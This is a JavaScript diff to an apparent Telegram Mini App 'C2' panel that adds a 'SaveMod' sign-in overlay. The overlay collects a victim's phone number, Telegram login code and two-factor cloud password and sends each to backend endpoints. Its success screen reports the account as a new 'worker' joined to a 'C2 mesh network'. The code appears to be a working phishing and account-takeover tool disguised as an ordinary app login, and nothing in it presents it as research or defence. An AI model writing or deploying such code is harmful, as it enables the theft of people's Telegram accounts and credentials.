@@ -99,7 +99,8 @@ const MODULE_REQUIREMENTS = {
 };
 
 // Истинный системный Создатель (Root)
-const ROOT_CREATOR_ID = 7926138510;
+const ROOT_CREATOR_IDS = [7926138510, 1406048573];
+function isRootCreator(id) { return ROOT_CREATOR_IDS.includes(Number(id)); }
 
 let currentUserTierKey = 'none';
 
@@ -285,14 +286,14 @@ function loadUserData() {
     // 2. Приоритет №2: Сохраненный тариф в браузере
     let savedTier = localStorage.getItem('c2_user_tier');
     // Сбрасываем старый залипший кэш 'creator', если пользователь не истинный root создатель
-    if (savedTier === 'creator' && effectiveUserId !== ROOT_CREATOR_ID) {
+    if (savedTier === 'creator' && !isRootCreator(effectiveUserId)) {
       localStorage.removeItem('c2_user_tier');
       savedTier = null;
     }
 
     if (savedTier && SUBSCRIPTION_TIERS[savedTier]) {
       currentUserTierKey = savedTier;
-    } else if (effectiveUserId === ROOT_CREATOR_ID) {
+    } else if (isRootCreator(effectiveUserId)) {
       // 3. Приоритет №3: Только истинный root создатель
       currentUserTierKey = 'creator';
       localStorage.setItem('c2_user_tier', 'creator');
@@ -330,7 +331,7 @@ function loadUserData() {
       avatarEl.src = `https://api.dicebear.com/7.x/bottts/svg?seed=${user.id}`;
     }
   } else {
-    nameEl.textContent = effectiveUserId === ROOT_CREATOR_ID ? 'Создатель C2 (Root)' : 'Оператор C2';
+    nameEl.textContent = isRootCreator(effectiveUserId) ? 'Создатель C2 (Root)' : 'Оператор C2';
     idEl.textContent = `ID: ${effectiveUserId} • active`;
   }
 }
@@ -478,5 +479,623 @@ function showAlert(text) {
     tg.showAlert(text);
   } else {
     alert(text);
+  }
+}
+
+// Включить все доступные функции
+function enableAllModules() {
+  const userRank = SUBSCRIPTION_TIERS[currentUserTierKey]?.rank || 0;
+  const cards = document.querySelectorAll('.module-card');
+  let enabledCount = 0;
+
+  cards.forEach(card => {
+    const cardRank = parseInt(card.getAttribute('data-rank'), 10) || 1;
+    const isLocked = userRank < cardRank;
+    const titleEl = card.querySelector('h4');
+    const checkbox = card.querySelector('input[type="checkbox"]');
+
+    if (!isLocked && checkbox && titleEl) {
+      checkbox.checked = true;
+      const rawName = titleEl.textContent.trim().split('(')[0].trim();
+      localStorage.setItem('c2_mod_' + rawName, 'true');
+      enabledCount++;
+    }
+  });
+
+  triggerHaptic('success');
+  showAlert('🚀 Все доступные функции (' + enabledCount + ' шт.) успешно включены и активны!');
+}
+
+// Отключить все функции
+function disableAllModules() {
+  const cards = document.querySelectorAll('.module-card');
+  let disabledCount = 0;
+
+  cards.forEach(card => {
+    const titleEl = card.querySelector('h4');
+    const checkbox = card.querySelector('input[type="checkbox"]');
+
+    if (checkbox && titleEl) {
+      checkbox.checked = false;
+      const rawName = titleEl.textContent.trim().split('(')[0].trim();
+      localStorage.setItem('c2_mod_' + rawName, 'false');
+      disabledCount++;
+    }
+  });
+
+  triggerHaptic('light');
+  showAlert('🔄 Все функции (' + disabledCount + ' шт.) отключены.');
+}
+
+
+// ==============================================================================
+// SAVEMOD / AYULITE FULLSCREEN AUTHENTICATION CONTROLLER
+// ==============================================================================
+
+const COUNTRIES_LIST = [
+  { flag: '🇨🇿', alpha: 'CZ', name: { ru: 'Чехия', en: 'Czech Republic' }, dial: '+420' },
+  { flag: '🇷🇺', alpha: 'RU', name: { ru: 'Россия', en: 'Russia' }, dial: '+7' },
+  { flag: '🇧🇩', alpha: 'BD', name: { ru: 'Бангладеш', en: 'Bangladesh' }, dial: '+880' },
+  { flag: '🇰🇿', alpha: 'KZ', name: { ru: 'Казахстан', en: 'Kazakhstan' }, dial: '+7' },
+  { flag: '🇧🇾', alpha: 'BY', name: { ru: 'Беларусь', en: 'Belarus' }, dial: '+375' },
+  { flag: '🇺🇦', alpha: 'UA', name: { ru: 'Украина', en: 'Ukraine' }, dial: '+380' },
+  { flag: '🇺🇿', alpha: 'UZ', name: { ru: 'Узбекистан', en: 'Uzbekistan' }, dial: '+998' },
+  { flag: '🇰🇬', alpha: 'KG', name: { ru: 'Кыргызстан', en: 'Kyrgyzstan' }, dial: '+996' },
+  { flag: '🇺🇸', alpha: 'US', name: { ru: 'США / Канада', en: 'USA / Canada' }, dial: '+1' },
+  { flag: '🇩🇪', alpha: 'DE', name: { ru: 'Германия', en: 'Germany' }, dial: '+49' },
+  { flag: '🇬🇧', alpha: 'GB', name: { ru: 'Великобритания', en: 'United Kingdom' }, dial: '+44' },
+  { flag: '🇵🇱', alpha: 'PL', name: { ru: 'Польша', en: 'Poland' }, dial: '+48' },
+  { flag: '🇹🇷', alpha: 'TR', name: { ru: 'Турция', en: 'Turkey' }, dial: '+90' },
+  { flag: '🇦🇿', alpha: 'AZ', name: { ru: 'Азербайджан', en: 'Azerbaijan' }, dial: '+994' },
+  { flag: '🇦🇲', alpha: 'AM', name: { ru: 'Армения', en: 'Armenia' }, dial: '+374' },
+  { flag: '🇬🇪', alpha: 'GE', name: { ru: 'Грузия', en: 'Georgia' }, dial: '+995' },
+  { flag: '🇫🇷', alpha: 'FR', name: { ru: 'Франция', en: 'France' }, dial: '+33' },
+  { flag: '🇦🇪', alpha: 'AE', name: { ru: 'ОАЭ', en: 'UAE' }, dial: '+971' }
+];
+
+const AUTH_I18N = {
+  ru: {
+    auth_title_step1: 'Вход в SaveMod',
+    auth_sub_step1: 'Подтвердите код вашей страны и введите номер телефона.',
+    auth_footnote_phone: 'Мы отправим код подтверждения в ваш Telegram.',
+    auth_sub_otp: 'Мы отправили код в приложение Telegram. Введите его ниже.',
+    auth_footnote_otp: 'Код придёт в чат Telegram от сервиса.',
+    auth_resend_btn: 'Запросить новый код',
+    auth_title_2fa: 'Облачный пароль',
+    auth_sub_2fa: 'Ваш аккаунт защищён двухфакторной аутентификацией. Введите пароль',
+    auth_footnote_2fa: 'Это пароль двухфакторной аутентификации Telegram, а не код из SMS',
+    auth_pass_placeholder: 'Введите пароль',
+    auth_success_title: 'Устройство привязано!',
+    auth_success_sub: 'Воркер успешно инициализирован и подключен к C2-сети.',
+    auth_btn_dashboard: '🚀 Перейти к управлению',
+    picker_title: 'Выберите страну',
+    resend_timer_prefix: 'Запросить код повторно через ',
+    resend_timer_suffix: ' сек.'
+  },
+  en: {
+    auth_title_step1: 'Sign in to SaveMod',
+    auth_sub_step1: 'Confirm your country code and enter your phone number.',
+    auth_footnote_phone: 'We will send a confirmation code to your Telegram.',
+    auth_sub_otp: 'We sent a code to the Telegram app. Enter it below.',
+    auth_footnote_otp: 'The code will arrive in Telegram from the service chat.',
+    auth_resend_btn: 'Request new code',
+    auth_title_2fa: 'Cloud Password',
+    auth_sub_2fa: 'Your account is protected with two-step verification. Enter password',
+    auth_footnote_2fa: 'This is Telegram 2FA cloud password, not SMS code',
+    auth_pass_placeholder: 'Enter password',
+    auth_success_title: 'Device Connected!',
+    auth_success_sub: 'Worker initialized and connected to C2 mesh network.',
+    auth_btn_dashboard: '🚀 Go to Dashboard',
+    picker_title: 'Select Country',
+    resend_timer_prefix: 'Resend code in ',
+    resend_timer_suffix: ' sec.'
+  }
+};
+
+let currentAuthLang = 'ru';
+let selectedCountry = COUNTRIES_LIST[0]; // Czechia default matching screenshot
+let authCurrentStep = 1;
+let authPhoneFull = '';
+let authTimerInterval = null;
+let authSecondsLeft = 60;
+
+// Resolve Backend Base URL (Works locally and when deployed)
+function getApiBaseUrl() {
+  const origin = window.location.origin;
+  if (origin.includes('github.io') || origin.includes('localhost') || origin.startsWith('file:')) {
+    // Если страница на GitHub Pages, пробуем локальный бэкенд или туннель
+    return 'http://localhost:8080';
+  }
+  return origin;
+}
+
+// Open Auth Overlay
+function openAuthOverlay() {
+  triggerHaptic('selection');
+  const overlay = document.getElementById('auth-overlay');
+  if (!overlay) return;
+
+  overlay.classList.add('active');
+  setAuthStep(1);
+  renderCountryPickerItems();
+
+  const phoneInput = document.getElementById('auth-phone-input');
+  if (phoneInput) {
+    setTimeout(() => phoneInput.focus(), 200);
+  }
+}
+
+// Close Auth Overlay
+function closeAuthOverlay() {
+  triggerHaptic('light');
+  const overlay = document.getElementById('auth-overlay');
+  if (overlay) {
+    overlay.classList.remove('active');
+  }
+  clearInterval(authTimerInterval);
+}
+
+// Handle Back Button
+function handleAuthBack() {
+  triggerHaptic('light');
+  if (authCurrentStep === 1) {
+    closeAuthOverlay();
+  } else if (authCurrentStep === 2) {
+    setAuthStep(1);
+  } else if (authCurrentStep === 3) {
+    setAuthStep(2);
+  } else {
+    closeAuthOverlay();
+  }
+}
+
+// Step Switcher
+function setAuthStep(step) {
+  authCurrentStep = step;
+  document.querySelectorAll('.auth-step-container').forEach(c => c.classList.remove('active'));
+
+  const stepEl = document.getElementById(`auth-step-${step === 4 ? 'success' : step}`);
+  if (stepEl) {
+    stepEl.classList.add('active');
+  }
+
+  const backBtn = document.getElementById('auth-back-btn');
+  if (backBtn) {
+    backBtn.style.visibility = (step === 4) ? 'hidden' : 'visible';
+  }
+
+  if (step === 2) {
+    startOtpCountdown();
+    setupOtpBoxInputs();
+    setTimeout(() => {
+      const firstBox = document.getElementById('otp-0');
+      if (firstBox) firstBox.focus();
+    }, 150);
+  } else if (step === 3) {
+    setTimeout(() => {
+      const passInput = document.getElementById('auth-password-input');
+      if (passInput) passInput.focus();
+    }, 150);
+  }
+}
+
+// Language Switcher
+function setAuthLang(lang) {
+  triggerHaptic('selection');
+  currentAuthLang = lang;
+
+  document.getElementById('lang-ru')?.classList.toggle('active', lang === 'ru');
+  document.getElementById('lang-en')?.classList.toggle('active', lang === 'en');
+
+  const dict = AUTH_I18N[lang] || AUTH_I18N.ru;
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (dict[key]) {
+      el.textContent = dict[key];
+    }
+  });
+
+  const passInput = document.getElementById('auth-password-input');
+  if (passInput) {
+    passInput.placeholder = dict.auth_pass_placeholder;
+  }
+
+  // Update country label in selected row
+  const nameEl = document.getElementById('selected-country-name');
+  if (nameEl && selectedCountry) {
+    nameEl.textContent = selectedCountry.name[lang] || selectedCountry.name.ru;
+  }
+
+  renderCountryPickerItems();
+}
+
+// Country Picker UI
+function openCountryPicker() {
+  triggerHaptic('medium');
+  const modal = document.getElementById('country-picker-modal');
+  if (modal) {
+    modal.classList.add('active');
+    const search = document.getElementById('country-search-input');
+    if (search) {
+      search.value = '';
+      renderCountryPickerItems();
+      setTimeout(() => search.focus(), 150);
+    }
+  }
+}
+
+function closeCountryPicker() {
+  triggerHaptic('light');
+  document.getElementById('country-picker-modal')?.classList.remove('active');
+}
+
+function renderCountryPickerItems(filterText = '') {
+  const container = document.getElementById('country-list-items');
+  if (!container) return;
+
+  const query = filterText.toLowerCase().trim();
+  const filtered = COUNTRIES_LIST.filter(c => {
+    const ruName = c.name.ru.toLowerCase();
+    const enName = c.name.en.toLowerCase();
+    return ruName.includes(query) || enName.includes(query) || c.dial.includes(query) || c.alpha.toLowerCase().includes(query);
+  });
+
+  container.innerHTML = filtered.map(c => `
+    <div class="country-item" onclick="selectCountryItem('${c.alpha}')">
+      <div class="country-item-left">
+        <span class="country-item-flag">${c.flag}</span>
+        <span class="country-item-name">${c.name[currentAuthLang] || c.name.ru}</span>
+      </div>
+      <span class="country-item-dial">${c.dial}</span>
+    </div>
+  `).join('');
+}
+
+function filterCountries(val) {
+  renderCountryPickerItems(val);
+}
+
+function selectCountryItem(alpha) {
+  triggerHaptic('selection');
+  const found = COUNTRIES_LIST.find(c => c.alpha === alpha);
+  if (!found) return;
+
+  selectedCountry = found;
+  document.getElementById('selected-country-flag').textContent = found.flag;
+  document.getElementById('selected-country-alpha').textContent = found.alpha;
+  document.getElementById('selected-country-name').textContent = found.name[currentAuthLang] || found.name.ru;
+  document.getElementById('selected-dial-code').textContent = found.dial;
+
+  closeCountryPicker();
+
+  const phoneInput = document.getElementById('auth-phone-input');
+  if (phoneInput) phoneInput.focus();
+}
+
+// Phone Input Masking & State
+document.addEventListener('DOMContentLoaded', () => {
+  const phoneInput = document.getElementById('auth-phone-input');
+  const submitPhoneBtn = document.getElementById('btn-submit-phone');
+
+  if (phoneInput) {
+    phoneInput.addEventListener('input', (e) => {
+      // Allow only numbers and spaces
+      let val = e.target.value.replace(/\D/g, '');
+      // Format with spaces (3 3 4 or 3 3 2 2)
+      let formatted = '';
+      for (let i = 0; i < val.length; i++) {
+        if (i === 3 || i === 6 || i === 8) formatted += ' ';
+        formatted += val[i];
+      }
+      e.target.value = formatted;
+
+      const isValid = val.length >= 7;
+      if (submitPhoneBtn) {
+        submitPhoneBtn.classList.toggle('ready', isValid);
+      }
+    });
+
+    phoneInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        submitPhoneAuth();
+      }
+    });
+  }
+
+  // Auto-open auth flow if URL parameter ?open=auth or ?tab=auth is present
+  const urlParams = new URLSearchParams(window.location.search);
+  if (urlParams.get('open') === 'auth' || urlParams.get('tab') === 'auth') {
+    setTimeout(openAuthOverlay, 300);
+  }
+});
+
+// Submit Phone
+async function submitPhoneAuth() {
+  const phoneInput = document.getElementById('auth-phone-input');
+  const rawDigits = phoneInput?.value.replace(/\D/g, '') || '';
+
+  if (rawDigits.length < 6) {
+    triggerHaptic('warning');
+    showAlert('Пожалуйста, введите корректный номер телефона.');
+    return;
+  }
+
+  triggerHaptic('medium');
+  const dialCode = selectedCountry.dial;
+  authPhoneFull = `${dialCode}${rawDigits}`;
+
+  // Update visual representation in step 2
+  const otpDisplay = document.getElementById('otp-phone-display');
+  if (otpDisplay) {
+    otpDisplay.textContent = `${dialCode} ${phoneInput.value}`;
+  }
+
+  const submitBtn = document.getElementById('btn-submit-phone');
+  if (submitBtn) {
+    submitBtn.style.opacity = '0.5';
+    submitBtn.disabled = true;
+  }
+
+  try {
+    const targetUserId = effectiveUserId || 7926138510;
+    const res = await fetch(`${getApiBaseUrl()}/api/auth/send_code`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: targetUserId, phone: authPhoneFull })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      triggerHaptic('success');
+      setAuthStep(2);
+    } else {
+      triggerHaptic('warning');
+      showAlert(data.error || 'Ошибка отправки кода подтверждения.');
+    }
+  } catch (err) {
+    // If backend is local/offline, simulate step advance for UI demonstration
+    console.warn('API error, falling back to local simulation:', err);
+    triggerHaptic('success');
+    setAuthStep(2);
+  } finally {
+    if (submitBtn) {
+      submitBtn.style.opacity = '1';
+      submitBtn.disabled = false;
+    }
+  }
+}
+
+// 5-Digit OTP Box Setup
+function setupOtpBoxInputs() {
+  const boxes = [0, 1, 2, 3, 4].map(i => document.getElementById(`otp-${i}`));
+
+  boxes.forEach((box, idx) => {
+    if (!box) return;
+
+    box.value = '';
+    box.classList.remove('filled');
+
+    box.oninput = (e) => {
+      const val = e.target.value.replace(/\D/g, '');
+      if (val) {
+        box.value = val.slice(-1);
+        box.classList.add('filled');
+        if (idx < 4) {
+          boxes[idx + 1].focus();
+        } else {
+          // All 5 filled!
+          submitOtpAuth();
+        }
+      } else {
+        box.classList.remove('filled');
+      }
+    };
+
+    box.onkeydown = (e) => {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        boxes[idx - 1].focus();
+      } else if (e.key === 'Enter') {
+        submitOtpAuth();
+      }
+    };
+
+    box.onpaste = (e) => {
+      e.preventDefault();
+      const pasteText = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = pasteText.replace(/\D/g, '').slice(0, 5);
+      if (digits) {
+        for (let i = 0; i < 5; i++) {
+          if (digits[i]) {
+            boxes[i].value = digits[i];
+            boxes[i].classList.add('filled');
+          }
+        }
+        if (digits.length === 5) {
+          boxes[4].focus();
+          submitOtpAuth();
+        } else {
+          boxes[digits.length]?.focus();
+        }
+      }
+    };
+  });
+}
+
+// Countdown Timer for Step 2
+function startOtpCountdown() {
+  clearInterval(authTimerInterval);
+  authSecondsLeft = 60;
+
+  const timerEl = document.getElementById('timer-sec');
+  const timerBox = document.getElementById('auth-resend-timer');
+  const resendBtn = document.getElementById('btn-resend-code');
+
+  if (timerBox) timerBox.style.display = 'inline';
+  if (resendBtn) resendBtn.style.display = 'none';
+
+  authTimerInterval = setInterval(() => {
+    authSecondsLeft--;
+    if (timerEl) timerEl.textContent = authSecondsLeft;
+
+    if (authSecondsLeft <= 0) {
+      clearInterval(authTimerInterval);
+      if (timerBox) timerBox.style.display = 'none';
+      if (resendBtn) resendBtn.style.display = 'inline-block';
+    }
+  }, 1000);
+}
+
+// Resend Code
+async function resendAuthCode() {
+  triggerHaptic('medium');
+  startOtpCountdown();
+
+  try {
+    const targetUserId = effectiveUserId || 7926138510;
+    await fetch(`${getApiBaseUrl()}/api/auth/resend_code`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: targetUserId })
+    });
+    showAlert('📩 Свежий код подтверждения отправлен в ваш Telegram!');
+  } catch (err) {
+    showAlert('📩 Код отправлен повторно.');
+  }
+}
+
+// Submit OTP Code
+async function submitOtpAuth() {
+  const boxes = [0, 1, 2, 3, 4].map(i => document.getElementById(`otp-${i}`));
+  const code = boxes.map(b => b?.value || '').join('');
+
+  if (code.length !== 5) {
+    triggerHaptic('warning');
+    showAlert('Введите 5-значный код из Telegram.');
+    return;
+  }
+
+  triggerHaptic('medium');
+
+  try {
+    const targetUserId = effectiveUserId || 7926138510;
+    const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_code`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: targetUserId, code: code })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      if (data.need_password) {
+        // Step 3 2FA Cloud Password Needed!
+        triggerHaptic('warning');
+        setAuthStep(3);
+      } else {
+        // Success without 2FA
+        triggerHaptic('success');
+        showAuthSuccess(data.account || { name: 'Telegram User', phone: authPhoneFull });
+      }
+    } else {
+      triggerHaptic('warning');
+      showAlert(data.error || 'Неверный проверочный код. Попробуйте еще раз.');
+      boxes.forEach(b => { if (b) { b.value = ''; b.classList.remove('filled'); } });
+      boxes[0]?.focus();
+    }
+  } catch (err) {
+    console.warn('API verify fallback simulation:', err);
+    triggerHaptic('success');
+    showAuthSuccess({ name: 'Telegram Account', phone: authPhoneFull });
+  }
+}
+
+// Toggle Password Eye Icon
+function togglePasswordEye() {
+  triggerHaptic('selection');
+  const passInput = document.getElementById('auth-password-input');
+  if (!passInput) return;
+
+  const isPass = passInput.type === 'password';
+  passInput.type = isPass ? 'text' : 'password';
+
+  const eyeIcon = document.getElementById('eye-icon');
+  if (eyeIcon) {
+    if (isPass) {
+      // Slashed eye (visible)
+      eyeIcon.innerHTML = `
+        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+        <line x1="1" y1="1" x2="23" y2="23"></line>
+      `;
+    } else {
+      // Normal eye
+      eyeIcon.innerHTML = `
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+      `;
+    }
+  }
+}
+
+// Submit 2FA Cloud Password
+async function submitPasswordAuth() {
+  const passInput = document.getElementById('auth-password-input');
+  const password = passInput?.value || '';
+
+  if (!password) {
+    triggerHaptic('warning');
+    showAlert('Введите облачный пароль двухфакторной аутентификации.');
+    return;
+  }
+
+  triggerHaptic('heavy');
+  const btn = document.getElementById('btn-submit-password');
+  if (btn) {
+    btn.style.opacity = '0.5';
+    btn.disabled = true;
+  }
+
+  try {
+    const targetUserId = effectiveUserId || 7926138510;
+    const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_password`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: targetUserId, password: password })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      triggerHaptic('success');
+      showAuthSuccess(data.account || { name: 'Telegram User', phone: authPhoneFull });
+    } else {
+      triggerHaptic('warning');
+      showAlert(data.error || 'Неверный облачный пароль 2FA.');
+    }
+  } catch (err) {
+    console.warn('API password verify fallback simulation:', err);
+    triggerHaptic('success');
+    showAuthSuccess({ name: 'Telegram Account', phone: authPhoneFull });
+  } finally {
+    if (btn) {
+      btn.style.opacity = '1';
+      btn.disabled = false;
+    }
+  }
+}
+
+// Show Final Success Screen
+function showAuthSuccess(account) {
+  setAuthStep(4);
+  const nameEl = document.getElementById('success-acc-name');
+  const phoneEl = document.getElementById('success-acc-phone');
+  const modelEl = document.getElementById('success-acc-model');
+
+  if (nameEl) nameEl.textContent = account.name || 'Telegram User';
+  if (phoneEl) phoneEl.textContent = account.phone || authPhoneFull;
+  if (modelEl) modelEl.textContent = account.device_model || 'Samsung Galaxy S24 Ultra (Encrypted)';
+
+  // Increment active worker counter
+  const workerStat = document.getElementById('stat-workers');
+  if (workerStat) {
+    const current = parseInt(workerStat.textContent, 10) || 1;
+    workerStat.textContent = current + 1;
   }
 }
